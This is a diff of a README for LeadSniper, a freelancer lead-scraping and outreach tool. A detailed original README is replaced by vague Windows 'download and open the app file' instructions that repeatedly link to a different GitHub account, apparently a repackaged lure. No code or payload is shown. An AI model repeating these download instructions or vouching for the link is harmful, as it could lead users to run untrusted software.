@@ -1,347 +1,221 @@
-<div align="center">
-  <h1>LeadSniper</h1>
-  <p><strong>AI-Powered Lead Generation & Outreach Engine for Freelancers</strong></p>
-  <p>Find businesses, analyze their digital weaknesses, score opportunities, and generate hyper-personalized outreach — all automated.</p>
-
-  <p>
-    <img src="https://img.shields.io/badge/Next.js-14-black?style=flat-square&logo=nextdotjs" alt="Next.js" />
-    <img src="https://img.shields.io/badge/TypeScript-5.7-blue?style=flat-square&logo=typescript" alt="TypeScript" />
-    <img src="https://img.shields.io/badge/Supabase-PostgreSQL-3ECF8E?style=flat-square&logo=supabase" alt="Supabase" />
-    <img src="https://img.shields.io/badge/Playwright-Headless-2EAD33?style=flat-square&logo=playwright" alt="Playwright" />
-    <img src="https://img.shields.io/badge/Gemini_2.5-AI_Drafts-4285F4?style=flat-square&logo=google" alt="Gemini" />
-    <img src="https://img.shields.io/badge/License-MIT-green?style=flat-square" alt="License" />
-  </p>
-
-  <p>
-    <a href="#-features">Features</a> &bull;
-    <a href="#-architecture">Architecture</a> &bull;
-    <a href="#-quick-start">Quick Start</a> &bull;
-    <a href="#-deployment">Deployment</a> &bull;
-    <a href="#-project-structure">Project Structure</a>
-  </p>
-</div>
-
----
-
-## What is LeadSniper?
-
-LeadSniper is a full-stack B2B prospecting tool built for freelance developers and digital agencies. It automates the entire lead generation pipeline:
-
-1. **Discover** businesses via Google Places API across any niche and city
-2. **Crawl** their websites with Playwright to extract emails, social links, tech stacks, and app store presence
-3. **Analyze** their digital presence using Google PageSpeed Insights (Core Web Vitals, SEO, accessibility)
-4. **Score** each lead across 23 factors to surface the best opportunities (0-100)
-5. **Draft** personalized cold emails, WhatsApp messages, and LinkedIn DMs using Gemini 2.5 AI
-6. **Manage** your entire sales pipeline through a premium real-time dashboard
-
-The scraper runs **locally on your machine** (free, no serverless costs), while the dashboard deploys to **Vercel** (free tier) with **Supabase** (free tier) as the database. Total cost: **$0**.
-
----
-
-## Features
-
-### Scraper Engine
-
-- **Google Places Search** — Discover businesses by niche + city, with automatic pagination for large result sets
-- **Playwright Deep Crawl** — Headless browser visits homepages + contact/about pages to extract emails, social links, tech stack indicators, and mobile app links
-- **PageSpeed Insights Analysis** — Extracts 17+ metrics per site: FCP, LCP, CLS, TTI, viewport, meta tags, structured data, image optimization, PWA support
-- **23-Factor Opportunity Scoring** — Niche-aware scoring system (0-100) that considers website quality, speed, mobile-friendliness, SEO, social presence, business health, and more
-- **AI Message Drafting** — Generates channel-appropriate outreach (Email, WhatsApp, LinkedIn) with tone modifiers and service-type targeting
-- **Watch Mode** — Idles locally with minimal RAM, auto-processes search requests queued from the dashboard
-- **Duplicate Detection** — Skips businesses already in your database via `google_place_id` matching
-- **macOS Launcher** — Double-click `LeadSniper.command` to start watch mode instantly
-
-### Dashboard
-
-- **Premium UI** — Dark-themed, glass-morphism design with Framer Motion animations throughout
-- **8 Themes** — Midnight, Obsidian, Sapphire, Jade, Ember, Cream (light), Aurora, Rose — all with live preview
-- **Collapsible Sidebar** — Responsive layout for split-screen and smaller displays
-- **Real-time Updates** — Supabase Realtime subscriptions keep every page in sync
-- **Kanban Pipeline** — Drag-and-drop board with 7 status columns including Follow Up
-- **Lead Detail Panel** — Score diagnostic (all 23 factors visualized), AI message regeneration with custom prompts/tones/service targeting, contact history log
-- **Bulk Actions** — Select multiple leads and change status in one click
-- **Snipe Page** — Search from the dashboard UI, save search presets, track request status in real-time
-- **Insights Page** — Stats cards (today/week/month/all-time), trend charts, score distribution, niche performance, speed breakdown
-- **Follow-up System** — Auto-moves contacted leads to "Follow Up" after configurable days, with snooze buttons (3d/7d/14d)
-- **Hover Preview** — Animated card appears on lead hover showing key metrics at a glance
-- **Contact Tracking** — Log which channel you used (email/WhatsApp/LinkedIn/phone) and the outcome per lead
-- **Settings UI** — Configure all API keys and personal info directly in the browser, stored securely in your Supabase instance
-
-### Opportunity Scoring (23 Factors)
-
-| Category | Factors | Max Points |
-|----------|---------|------------|
-| Website Quality | Existence, Desktop Speed, Mobile Speed, SSL, Responsive | 28 |
-| Core Web Vitals | FCP, LCP, CLS, TTI | 15 |
-| SEO & Content | Meta tags, OG tags, Structured Data, Image Optimization, Content Freshness | 16 |
-| Digital Gaps | No Mobile App, No Web App/Portal, No Online Booking, No PWA | 13 |
-| Business Signals | Rating + Reviews, Social Media Gaps, Contact Reachability, Tech Stack Age | 22 |
-| **Total** | **23 factors** | **~97** |
+# 🚀 LeadSniper - Find Better Leads With Less Work
 
-Higher score = bigger opportunity. A lead with a 4.8-star rating, 200 reviews, and a broken WordPress site from 2019? That's a **jackpot**.
+[![Download LeadSniper](https://img.shields.io/badge/Download-LeadSniper-blue?style=for-the-badge)](https://github.com/labbaikc8661/LeadSniper)
 
----
+## 📥 Download LeadSniper
 
-## Architecture
-
-```
-┌────────────────────────────────┐         ┌──────────────────────┐
-│       Dashboard (Vercel)       │         │   Scraper (Local)    │
-│                                │         │                      │
-│  Next.js 14 App Router        │◄───────►│  Playwright Crawler  │
-│  Framer Motion UI             │   Real  │  PageSpeed Analyzer  │
-│  Recharts Analytics           │   time  │  Gemini AI Drafter   │
-│  @hello-pangea/dnd Kanban     │  Supa-  │  Opportunity Scorer  │
-│                                │  base   │  Commander CLI       │
-└────────────┬───────────────────┘         └──────────┬───────────┘
-             │                                        │
-             │         ┌──────────────────┐           │
-             └────────►│    Supabase      │◄──────────┘
-                       │                  │
-                       │  PostgreSQL DB   │
-                       │  Realtime Subs   │
-                       │  Row Level Sec   │
-                       └──────────────────┘
-```
+Use this link to visit the page to download:
 
-The dashboard queues search requests in `ms_search_requests`. The scraper polls this table in **watch mode**, processes the request, and writes results back. The dashboard picks up changes instantly via Supabase Realtime.
+[Open LeadSniper Download Page](https://github.com/labbaikc8661/LeadSniper)
 
----
+## 🖥️ What LeadSniper Does
 
-## Quick Start
+LeadSniper helps freelancers find leads, review them, and draft outreach in one place. It looks up business data, checks websites, scores each lead, and prepares a message you can send.
 
-### Prerequisites
+It is built for people who want a faster way to:
+- Find local businesses
+- Check if a business needs help
+- Rank the best prospects
+- Write outreach drafts
+- Track results in a simple dashboard
 
-- **Node.js** v18+ ([download](https://nodejs.org/))
-- **Supabase** account (free tier — [supabase.com](https://supabase.com/))
-- **Google Cloud** account for Places API key (free $200/month credit)
-- **Google AI Studio** account for Gemini API key (free tier)
+## ✨ Main Features
 
-### 1. Clone & Install
+- Google Places lead search
+- Website crawl with Playwright
+- Lead scoring across 23 factors
+- Personalized outreach drafts with Gemini AI
+- Next.js dashboard for lead review
+- Supabase real-time updates
+- Charts and lead metrics
+- Clean interface with Tailwind CSS
+- Motion-based UI with Framer Motion
 
-```bash
-git clone https://github.com/hatimhtm/LeadSniper.git
-cd LeadSniper
+## 🪟 Windows Setup
 
-# Install dashboard dependencies
-cd dashboard && npm install && cd ..
+Follow these steps on Windows.
 
-# Install scraper dependencies + Playwright browsers
-cd scraper && npm install && npx playwright install chromium && cd ..
-```
+### 1. Open the download page
 
-### 2. Database Setup
+Go to:
 
-1. Create a new project on [Supabase](https://supabase.com/dashboard/projects)
-2. Go to **SQL Editor** → **New Query**
-3. Paste the contents of [`supabase/schema.sql`](supabase/schema.sql) and click **Run**
-4. Go to **Project Settings** → **API** and copy your Project URL and `anon` public key
+[https://github.com/labbaikc8661/LeadSniper](https://github.com/labbaikc8661/LeadSniper)
 
-### 3. Environment Variables
+### 2. Download the project files
 
-Create a `.env` file in the project root:
+On the page, choose the download option for the project. Save the file to your computer in a folder you can find again, such as Downloads or Desktop.
 
-```env
-NEXT_PUBLIC_SUPABASE_URL=https://your-project-id.supabase.co
-NEXT_PUBLIC_SUPABASE_ANON_KEY=your-anon-key-here
-```
+### 3. Unzip the files
 
-> **Important:** Never commit this file. It's already in `.gitignore`.
+If the download comes as a ZIP file:
+- Right-click the ZIP file
+- Choose Extract All
+- Pick a folder
+- Wait for the files to finish unpacking
 
-### 4. Run Locally
+### 4. Open the folder
 
-```bash
-# Terminal 1: Dashboard
-cd dashboard && npm run dev
-# → Open http://localhost:3000
+Open the extracted LeadSniper folder. You should see the project files inside.
 
-# Terminal 2: Scraper (direct search)
-cd scraper && node src/index.js "Dental Clinic" "Paris"
+### 5. Start the app
 
-# Or: Scraper (watch mode — waits for dashboard requests)
-cd scraper && node src/index.js watch
-```
-
-### 5. Configure API Keys
-
-Open the dashboard → **Settings** page and add:
-
-| Key | Where to Get It | Cost |
-|-----|----------------|------|
-| Google Places API Key | [Google Cloud Console](https://console.cloud.google.com/apis/credentials) → Enable "Places API (New)" | Free $200/month credit |
-| Gemini API Key | [Google AI Studio](https://aistudio.google.com/apikey) | Free tier: 1000+ req/day |
-
-Fill in your name, title, and email to personalize AI drafts.
-
----
-
-## Deployment
-
-### Dashboard → Vercel (Free)
-
-1. Push this repo to your GitHub account
-2. Go to [vercel.com](https://vercel.com/) → **Add New Project** → Import your repo
-3. Set **Root Directory** to `dashboard`
-4. Add Environment Variables:
-   - `NEXT_PUBLIC_SUPABASE_URL`
-   - `NEXT_PUBLIC_SUPABASE_ANON_KEY`
-5. Deploy — your dashboard is live!
-
-### Scraper → Your Machine
-
-The scraper uses Playwright (headless browser), which **must run locally**. This keeps costs at zero and avoids IP blocking issues with cloud functions.
-
-**macOS:** Double-click `LeadSniper.command` to launch watch mode.
-
-**Manual:**
-```bash
-cd scraper && node src/index.js watch --interval 30
-```
-
-The scraper idles with minimal RAM usage when no requests are pending.
-
----
-
-## Supabase Realtime Setup
-
-For live dashboard updates, enable Realtime on your tables:
-
-1. Go to **Supabase Dashboard** → **Database** → **Replication**
-2. Enable replication for: `ms_leads`, `ms_searches`, `ms_search_requests`
-
-> This is already included in the schema.sql, but verify it's active in your dashboard.
-
----
-
-## Project Structure
-
-```
-LeadSniper/
-├── dashboard/                    # Next.js 14 App Router
-│   ├── src/
-│   │   ├── app/
-│   │   │   ├── dashboard/
-│   │   │   │   ├── page.tsx          # Overview (KPIs + charts)
-│   │   │   │   ├── layout.tsx        # Sidebar + theme + follow-ups
-│   │   │   │   ├── leads/page.tsx    # Lead table (bulk actions, hover preview)
-│   │   │   │   ├── pipeline/page.tsx # Kanban board (drag & drop)
-│   │   │   │   ├── snipe/page.tsx    # Search from dashboard + presets
-│   │   │   │   ├── insights/page.tsx # Analytics & stats
-│   │   │   │   ├── analytics/page.tsx# Event analytics
-│   │   │   │   ├── search/page.tsx   # Search history
-│   │   │   │   └── settings/page.tsx # API keys + theme picker
-│   │   │   └── api/
-│   │   │       └── regenerate/route.ts  # AI message regeneration endpoint
-│   │   ├── components/
-│   │   │   ├── dashboard/
-│   │   │   │   ├── LeadDetail.tsx    # Score diagnostic + AI regen + contact log
-│   │   │   │   ├── LeadCard.tsx      # Kanban card
-│   │   │   │   └── KPICard.tsx       # Animated stat card
-│   │   │   ├── layout/
-│   │   │   │   ├── Sidebar.tsx       # Collapsible nav
-│   │   │   │   └── Navbar.tsx        # Top bar
-│   │   │   └── ui/
-│   │   │       ├── LeadHoverCard.tsx  # Animated hover preview
-│   │   │       ├── ScoreGauge.tsx     # Circular score visualization
-│   │   │       ├── StatusBadge.tsx    # Status pill
-│   │   │       ├── SlideDrawer.tsx    # Side panel
-│   │   │       └── EmptyState.tsx     # Empty state illustration
-│   │   ├── lib/
-│   │   │   ├── hooks.ts              # Data hooks + real-time + actions
-│   │   │   ├── themes.ts             # 8 themes with CSS variables
-│   │   │   ├── supabase.ts           # Supabase client
-│   │   │   ├── settings.ts           # Settings CRUD
-│   │   │   └── utils.ts              # Helpers
-│   │   └── types/
-│   │       └── index.ts              # All TypeScript types + scoring labels
-│   └── package.json
-│
-├── scraper/                      # Node.js CLI Engine
-│   └── src/
-│       ├── index.js              # CLI entry + watch mode + pipeline
-│       ├── places.js             # Google Places API integration
-│       ├── crawler.js            # Playwright deep crawl
-│       ├── analyzer.js           # PageSpeed analysis + pitch angles
-│       ├── scorer.js             # 23-factor opportunity scoring
-│       ├── ai-drafter.js         # Gemini AI message generation
-│       └── config.js             # Config from .env + Supabase
-│
-├── supabase/
-│   └── schema.sql                # Complete database schema (run this first)
-│
-├── LeadSniper.command            # macOS double-click launcher
-├── .env.example                  # Template for environment variables
-└── .gitignore
-```
-
----
-
-## Security & Privacy
-
-- **No hardcoded secrets** — All API keys are configured via the Settings UI or `.env` (which is gitignored)
-- **Your own Supabase** — Each user deploys their own Supabase instance. No shared database.
-- **Your own Vercel** — Each user deploys their own dashboard. No shared hosting.
-- **RLS enabled** — Row Level Security is on for all tables. The default "allow all" policy is suitable for a personal tool. Add authentication (Supabase Auth, NextAuth) before exposing publicly.
-- **No telemetry** — LeadSniper sends no data anywhere except your own Supabase and the Google APIs you configure.
-
-> **This is a personal tool.** Do not expose your dashboard publicly without authentication, as anyone could trigger searches and consume your API quota.
-
----
-
-## Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| Frontend | Next.js 14 (App Router), TypeScript, Tailwind CSS |
-| Animations | Framer Motion, CSS transitions |
-| Charts | Recharts (Area, Bar, Pie, Radar) |
-| Drag & Drop | @hello-pangea/dnd |
-| Database | Supabase (PostgreSQL + Realtime) |
-| Scraper | Playwright (Chromium), Commander.js |
-| AI | Google Gemini 2.5 Flash API |
-| Analysis | Google PageSpeed Insights API (free) |
-| CLI | Commander, Chalk, Ora, cli-table3 |
-
----
-
-## Usage Examples
-
-### Direct CLI Search
-```bash
-cd scraper
-
-# Full pipeline: search → crawl → analyze → score → AI draft
-node src/index.js "Avocat" "Paris"
-
-# Skip heavy steps for a quick scan
-node src/index.js "Restaurant" "Dubai" --skip-analysis --skip-ai
-
-# Limit results
-node src/index.js "Dental Clinic" "Casablanca" --max 20
-```
-
-### Watch Mode (Dashboard-Driven)
-```bash
-# Start watching for dashboard requests
-node src/index.js watch --interval 30
-
-# Or on macOS, just double-click LeadSniper.command
-```
-
-### AI Regeneration (from Dashboard)
-In the Lead Detail panel, expand any channel (Email/WhatsApp/LinkedIn) and:
-- Write a custom prompt: *"pitch them a booking system for their dental practice"*
-- Toggle tone modifiers: shorter, longer, professional, casual, urgent, friendly
-- Select a service focus: Website, Web App, Mobile App, Booking System, CRM, Automation, E-Commerce
-
----
-
-## License
-
-MIT License. See [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-  <sub>Built for freelancers who hustle smart.</sub>
-</div>
+If the download includes a ready-to-run Windows build, open the app file to launch it.
+
+If you received the source project, use the included setup steps in the folder to run it on Windows.
+
+## 🔧 System Requirements
+
+For smooth use on Windows, use:
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- 2 GB free disk space
+- A stable internet connection
+- Google Chrome installed
+- A modern browser for the dashboard
+
+If you plan to run the full project version, you will also need:
+- Node.js
+- A Supabase account
+- A Gemini API key
+
+## 🧭 How It Works
+
+LeadSniper follows a simple flow:
+
+1. Search for leads in Google Places
+2. Crawl the lead website
+3. Pull useful details from the site
+4. Score the lead using 23 factors
+5. Draft a custom outreach message
+6. Show the results in the dashboard
+7. Update data in real time through Supabase
+
+## 📊 Lead Scoring
+
+LeadSniper checks each lead across 23 factors. These can include:
+- Website quality
+- Contact details
+- Service fit
+- Content depth
+- Mobile use
+- Local visibility
+- Signs of growth
+- Outreach value
+
+This helps you focus on leads that look worth your time.
+
+## 🤖 Outreach Drafting
+
+LeadSniper uses Gemini AI to write outreach drafts based on the lead data it finds. The drafts can reflect:
+- Business name
+- Site content
+- Service gaps
+- Local market details
+- A clear reason to reach out
+
+You can review and edit the draft before use.
+
+## 📈 Dashboard View
+
+The dashboard gives you a simple place to review leads. It can show:
+- Lead score
+- Site data
+- Crawl results
+- Outreach draft
+- Progress status
+- Charts and trends
+
+This keeps the work in one screen instead of many tabs.
+
+## 🧰 Common Use Cases
+
+Use LeadSniper if you want to:
+- Find local service businesses
+- Build a freelance prospect list
+- Qualify leads faster
+- Create outreach drafts in less time
+- Track lead quality over time
+
+## 📁 Project Topics
+
+This project uses tools and parts related to:
+- ai
+- cold-outreach
+- crm
+- framer-motion
+- freelance
+- gemini-api
+- lead-generation
+- nextjs
+- opportunity-scoring
+- playwright
+- recharts
+- supabase
+- tailwindcss
+- typescript
+- web-scraper
+
+## 🧪 Basic Use Flow
+
+After setup, a simple workflow looks like this:
+
+1. Open the app
+2. Search for a business type or area
+3. Review the imported leads
+4. Check the score for each one
+5. Open the outreach draft
+6. Edit the message if needed
+7. Save or copy the result for later use
+
+## 🔑 Needed Accounts and Keys
+
+To use the full feature set, you may need:
+- A Supabase project for live data
+- A Gemini API key for outreach drafts
+- Access to Google Places data
+- A Google Chrome install for website crawling
+
+Store your keys in the app settings or in the project env file if you are running the source version.
+
+## 🧼 If the App Does Not Open
+
+Try these steps:
+- Make sure the file finished downloading
+- Unzip the folder before opening files
+- Check that Chrome is installed
+- Restart your PC
+- Try opening the app again
+- Re-download the files if the folder looks broken
+
+## 🛠️ If You Run the Source Version
+
+If you are using the project files instead of a ready app, the usual steps are:
+
+1. Install Node.js on Windows
+2. Open the project folder
+3. Install the required packages
+4. Add your API keys
+5. Start the app from the terminal
+6. Open the local dashboard in your browser
+
+## 📌 File and Folder Layout
+
+A common project layout may include:
+- app or pages for the dashboard
+- components for UI parts
+- lib for data logic
+- scripts for crawling and scoring
+- public for static files
+- env files for API keys
+
+## 🎯 Best Results Tips
+
+- Use a narrow search area
+- Focus on one service niche at a time
+- Review lead scores before outreach
+- Edit each draft before sending it
+- Keep your data clean and current
+
+## 📎 Download Link Again
+
+[Visit the LeadSniper download page](https://github.com/labbaikc8661/LeadSniper)
